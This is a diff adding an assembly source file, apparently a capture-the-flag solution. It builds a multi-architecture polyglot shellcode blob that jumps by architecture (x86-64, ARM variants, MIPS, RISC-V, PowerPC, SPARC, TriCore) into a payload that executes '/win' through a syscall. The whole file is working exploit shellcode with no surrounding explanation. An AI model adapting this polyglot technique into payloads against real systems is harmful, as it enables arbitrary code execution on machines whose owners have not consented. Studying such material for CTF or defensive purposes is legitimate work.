@@ -1,0 +1,116 @@
+[BITS 64]
+[ORG 0x31337800]
+sparc_onion:
+ppcbe_onion:
+tricore_onion:
+dd 0x243c0040 ; 0x00: sparc + 0xf090 & ppcbe + 0x3c24 & tricore + 0x4a
+dd 0x243c0040
+riscv_onion:
+dd 0x292ba52d ; 0x08: riscv + 0x62a
+armtbe_onion:
+dd 0x414344e2 ; 0x0c: armtbe + 0x48c
+armle_onion:
+dd 0x34bf0d24 ; 0x10: armle + 0xd2c
+armtle_onion:
+dd 0x55d5e0cf ; 0x14: armtle + 0x1a2
+armbe_onion:
+dd 0xbd11ff05 ; 0x18: armbe + 0x1c4
+x86_onion:
+dd 0x2920eb55 ; 0x1c: x86 + 0x23
+mipsle_onion:
+dd 0x45160600 ; 0x20: mipsle + 0x1808
+dd 0x45160600
+mipsbe_onion:
+dd 0x00051645 ; 0x28: mipsbe + 0x1408
+dd 0x00051645
+
+times 0x23+0x1c-($-$$) db 0x99
+x86_trampoline:
+jmp x86_payload
+
+times 0x4a-($-$$) db 0x99
+tricore_payload:
+;jl +12
+dd 0x0006005d
+db "/win",0,0,0,0
+;mov.aa a4,a11
+;syscall 69
+dd 0x4000b001, 0x008450ad
+
+x86_payload:
+lea rdi, [rel win]
+mov rax,59
+syscall
+
+win:
+db "/win",0
+
+times 0x1a2+0x14-($-$$) db 0x99
+armtle_payload:
+;mov r0, pc
+;add r0, offset
+;mov r7, #11
+;svc 0
+dw 0x4678, 0x3004, 0x270b, 0xdf00
+db "/win",0
+
+times 0x1c4+0x18-($-$$) db 0x99
+armbe_payload:
+dd 0x0f00a0e1, 0x080080e2, 0x0b70a0e3, 0x000000ef
+db "/win",0
+
+times 0x48c+0x0c-($-$$) db 0x99
+armtbe_payload:
+dw 0x7846, 0x0430, 0x0b27, 0x00df
+db "/win",0
+
+times 0x62a+0x08-($-$$) db 0x99
+riscv_payload:
+;li a7, 221
+;auipc a0,0
+;addi a0,a0,12
+;scall
+dd 0x0dd00893, 0x00000517, 0x00c50513, 0x00000073
+db "/win",0
+
+times 0xd2c+0x10-($-$$) db 0x99
+armle_payload:
+dd 0xe1a0000f, 0xe2800008, 0xe3a0700b, 0xef000000
+db "/win",0
+
+times 0x1408+0x28-($-$$) db 0x99
+mipsbe_payload:
+dd 0x772f0c3c, 0x6e698c35, 0xf8ffbd23, 0x0000acaf, 0x2520a003, 0xc1130224, 0x0c000000
+
+times 0x1808+0x20-($-$$) db 0x99
+mipsle_payload:
+;dli $t0, 0x6e69772f
+;sub $sp,$sp,8
+;sw $t0,($sp)
+;move $a0,$sp
+;dli $v0, 5057
+;syscall
+dd 0x3c0c6e69, 0x358c772f, 0x23bdfff8, 0xafac0000, 0x03a02025, 0x240213c1, 0x0000000c
+
+times 0x3c24-($-$$) db 0x99
+ppcbe_payload:
+;bl +12
+dd 0x0d000048
+db "/win",0,0,0,0
+;mflr r3
+;li r0,11
+;sc
+dd 0xa602687c, 0x0b000038, 0x02000044
+
+times 0xf090-($-$$) db 0x99
+sparc_payload:
+;call +16
+dd 0x04000040
+dd 0x04000040
+db "/win",0,0,0,0
+;add o7, 4, o0
+;add g0, 59, g1
+;ta 0x10
+dd 0x04e00390
+dd 0x3b200082
+dd 0x1020d091
